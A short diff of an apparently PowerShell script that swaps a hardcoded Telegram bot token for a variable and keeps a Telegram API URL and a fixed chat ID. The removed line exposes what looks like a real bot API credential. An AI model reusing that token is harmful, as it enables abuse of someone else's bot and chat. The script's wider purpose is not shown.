@@ -1,4 +1,4 @@
-$Token = "7605801989:AAFdk2GcpcckPoX1saBIjgJSPJeCGk5Yc-s"
+$Token = "$tg"
 $PassPhrase = "$env:COMPUTERNAME"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
 $chatID = "6686157223"
